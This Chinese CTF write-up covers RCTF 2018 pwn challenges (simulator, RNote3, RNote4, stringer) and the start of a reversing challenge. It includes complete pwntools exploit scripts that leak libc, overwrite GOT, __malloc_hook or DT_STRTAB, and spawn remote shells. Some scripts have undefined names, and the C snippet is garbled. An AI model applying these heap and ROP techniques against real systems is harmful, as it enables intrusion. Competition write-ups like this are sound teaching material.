基本操作有这些，syscall 只实现了一个，就是print int，感觉可以利用lw  
和sw进行任意地址读写
然后将 ___stack_chk_fail 的got 写改成 ret 的地址，就可以用栈溢出随便玩了  
漏洞点在这里，没有判断小于0的情况
    li \$a0,1883262208  
    li \$a1,1883262209  
    add \$a0,\$a0,\$a1  
    lw \$a0,\$a0
    li \$v0,1
    syscall
    END
利用这个payload可以打印got中某个地址的值
这里可以劫持控制流
    li $a0,1883262209
    li $a1,1883262210
    add $a1,$a0,$a1
    move $a0,$a1
    lw $a0,$a0
    li $v0,1
    syscall
    move $a0,$a1
    li $v0,134523991
    sw $v0,$a0
    END
输完这个payload之后，就可以栈溢出
弄了半天ret2dlresolve，然后发现找libc快多了..........
下面是payload
    from pwn import *
    from hashlib import sha256
    import itertools
    import roputils
    debug=0
    context.log_level='debug'
    rop=roputils.ROP('./simulator')
    if debug:
        p=process('simulator')
        context.log_level='debug'
        gdb.attach(p)
        e=ELF('/lib/i386-linux-gnu/libc-2.24.so')
    else:
        p=remote('simulator.2018.teamrois.cn', 3131)
        e=ELF('./libc.so')
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    s=string.letters+string.digits
    if debug==0:
        chal=p.recv(16)
        for i in itertools.permutations(s,4):
            sol=''.join(i)
            if sha256(chal + sol).digest().startswith('\0\0\0'):
                break
        p.send(sol)
    payload='''
    li $a0,1883262209
    li $a1,1883262210
    add $a1,$a0,$a1
    move $a0,$a1
    lw $a0,$a0
    li $v0,1
    syscall
    move $a0,$a1
    li $v0,134523991
    sw $v0,$a0
    END
    '''
    se(payload)
    puts=0x080485C0
    main_addr=0x804AC23
    bss_tmp=0x804DB20+0x100
    pret=0x804B33B
    tpayload='a'*44+p32(bss_tmp)+p32(puts)+p32(main_addr)+p32(0x0804D010)
    ru('leave a comment: ')
    se(tpayload+'\n')
    printf=u32(p.recv(4))
    base=printf-e.symbols['printf']
    system=base+e.symbols['system']
    binsh=base+e.search('/bin/sh').next()
    rpayload='a'*48+p32(system)+p32(binsh)*2
    se(rpayload+'\n')
    p.interactive()
flag: **RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}**
### **RNote3**
漏洞在delete那里.....未初始化变量......看了栈溢出那里半天....难受
delete函数未初始化变量，所以可以delete 任意一块地方
具体是先view了某一个想delete的堆，然后堆地址保存在栈上，然后这个时候进delete函数，随便输一个东西，然后因为找不到对应的堆，然后  
i 这个时候是31，但是free的是栈上面的那个变量，所以可以use after  
free，之后一个fastbin attack过去就可以了
payload 如下
    from pwn import *
    debug=0
    context.log_level='debug'
    e=ELF('./libc.so')
    if debug:
        p=process('RNote3',env={'LD_PRELOAD':'./libc.so'})
        context.log_level='debug'
        gdb.attach(p)
    else:
        p=remote('rnote3.2018.teamrois.cn',7322)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def add(title,sz,content):
        se('1\n')
        ru('please input title:')
        se(title)
        ru('please input content size:')
        se(str(sz)+'\n')
        ru('please input content:')
        se(content)
        sleep(0.1)
    def show(title):
        se('2\n')
        ru('please input note title: ')
        se(title)
        ru('note content: ')
        sleep(0.1)
    def edit(title,content):
        se('3\n')
        ru('please input note title:')
        se(title)
        ru('please input new content: ')
        se(content)
        sleep(0.1)
    def delete(title):
        se('4\n')
        ru('please input note title: ')
        se(title)
        sleep(0.2)
    add('1\n',0xa0,'a\n')
    add('2\n',0xa0,'b\n')
    show('1\n')
    delete('a\n')
    show('\n')
    libc=u64(p.recv(6)+'\x00\x00')
    base=libc-0x3C4B78
    malloc_hook=base+e.symbols['__malloc_hook']
    add('3\n',0xa0,'c\n')
    add('4\n',0x68,'d\n')
    add('5\n',0x68,'e\n')
    show('4\n')
    delete('a\n')
    edit('\n',p64(malloc_hook-0x23)+'\n')
    add('6\n',0x68,'f\n')
    add('7\n',0x68,'a'*3+p64(base+0x4526a)*2+p64(base+0x846D0)+'\n')
    se('1\n')
    p.interactive()
flag: **RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}**
### **RNote4**
堆溢出，可以变成任意写...
然后改掉DT_STRTAB的值，改到bss段的一个地方，之后往上面放system，然后delete掉一个堆，这个时候会调用free，然后因为free是第一次被调用，会调用dl_resolve来找在libc中的地址  
，因为改了DT_STRTAB，所以会找到sysytem，变成调用system(“/bin/sh”);，之后就get  
shell了
    from pwn import *
    debug=0
    context.log_level='debug'
    if debug:
        p=process('RNote4',env={'LD_PRELOAD':'./libc.so'})
        context.log_level='debug'
        gdb.attach(p)
    else:
        p=remote('rnote4.2018.teamrois.cn',6767)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def add(sz,content):
        se('\x01')
        se(chr(sz))
        se(content)
    def edit(idx,sz,content):
        se('\x02')
        se(chr(idx))
        se(chr(sz))
        se(content)
    def delete(idx):
        se('\x03')
        se(chr(idx))
    def write(addr,content):
        payload='a'*0x18+p64(0x21)+p64(0x18)+p64(addr)
        edit(0,len(payload),payload)
        edit(1,len(content),content)
    add(0x18,'a'*0x18)
    add(0x18,'b'*0x18)
    add(0x8,'/bin/sh\x00')
    write(0x601EB0,p64(0x602100))
    write(0x602100,'a'*0x5F+'system')
    delete(2)
    p.interactive()
flag: **RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}**
### **stringer**
readstr 末尾不会强制+0
*(_BYTE *)(size - 1 + p) = 0;
根据size 来，可leak
calloc 会清空原来chunk上的内容,libc 2.23 设置 is_mmap bit 可以绕过
del 有 uaf
结合起来 构造 overlap + uaf
使用 edit 功能可以构造出来一个 overlap
有对齐。改最后一个 byte是不行的了，尝试第二个byte
almost
get it
思路
edit 修改 fastbin 的第二个byte 造成偏移
在偏移位置写一个 fake fastbin
libc 2.23 版本 calloc的时候如果 is_mmap bit 被设置了，不会清空
使用fake fastbin 修改一个 unsorted bin 的size 造成overlap
后面就是 leak 然后fastbin attack 的常规套路了
    #coding:utf-8
    from pwn import *
    import sys
    import time
    file_addr='./stringer'
    libc_addr='./libc.so.6'
    host='stringer.2018.teamrois.cn'
    port=7272
    libc=ELF(‘./libc.so.6’)
    p=remote(host,port)
    malloc_hook_off=libc.symbols['__malloc_hook']
    free_hook_off=libc.symbols['__free_hook']
    unsorted_off=malloc_hook_off+88+0x10
    fake_fastbin_malloc_hook=unsorted_off-88-0x13-0x20
    def menu(op):
        p.sendlineafter('choice:',str(op))
    def newsome(num,con):
        menu(1)
        p.sendlineafter('length:',str(num))
        p.sendlineafter('content:',con)
    def showsome():
        menu(2)
    def editsome(index,byteindex):
        menu(3)
        p.sendlineafter('index:',str(index))
        p.sendlineafter('index:',str(byteindex))
    def delsome(index):
        menu(4)
        p.sendlineafter('index:',str(index))
    newsome(0x28,'0'*(0x10-4)+p64(0x31))
    newsome(0x100-0x20,'1'*0xc0+p64(0)+p64(0x33)+p64(0))
    newsome(0x100,'2'*0x10)
    newsome(0x60,'3'*0x10)
    newsome(0x28,'4'*0x10)
    delsome(0)
    delsome(4)
    editsome(4,1)
    newsome(0x28,'5'*0x10)
    #6
    newsome(0x28,p64(0)*3+p64(0x181))
    delsome(2)
    delsome(3)
    newsome(0x80,'7'*0x10)
    newsome(0x90,'8'*0x70+p64(0)+p64(0x73))
    delsome(8)
    newsome(0x60,'9'*(0x20-1))
    p.recvuntil('99999999\n')
    leak=u64(p.recvline().strip().ljust(8,'\x00'))
    libc_base=leak-unsorted_off
    leaksome['leak']=leak
    leaksome['libc_base']=libc_base
    # overwrite 2 0x71
    newsome(0x90,'a'*0x70+p64(0)+p64(0x71))
    delsome(10)
    delsome(9)
    newsome(0x90,'b'*0x70+p64(0)+p64(0x71)+p64(libc_base+fake_fastbin_malloc_hook))
    delsome(0xb)
    newsome(0x60,'c'*0x10)
    one_gadget=0xf02a4 
    newsome(0x60,'d'*3+p64(libc_base+one_gadget)*4)
    menu(1)
    p.sendline(str(0x90))
    show_leak()
    exp_bp('aaaaaaa')
    p.interactive()
flag: **RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}**
## 0x03 RE
### **babyre**
out数据4字节一组, 流程sub_80488E0, 算法sub_804868B(部分参数不相关), 字符0x20-0x7F穷举就完事儿了.
    #include 
    #include 
    #include 
    uint32_t foo(uint32_t a1, uint64_t a2) // sub_804868B
    {
        int j;
        uint64_t v5;
        uint32_t in;
        in = a1;
        for (j = 0; j > (j & 0x1F);
            if (j & 0x20)
                v5 = v5 >> 32;
            in = (in >> 1) ^ ((v5 ^ in ^ (in >> 16) ^ (0x5C743A2E >> (((in >> 1) & 1)
                + 2
                * (2
                    * (((in >> 20) & 1)
                        + 2
                        * (2 * ((in & 0x80000000) != 0)
                            + ((in >> 26) & 1)))
                    + ((in >> 9) & 1))))) << 31);
        }
        return in;
    }
    int main()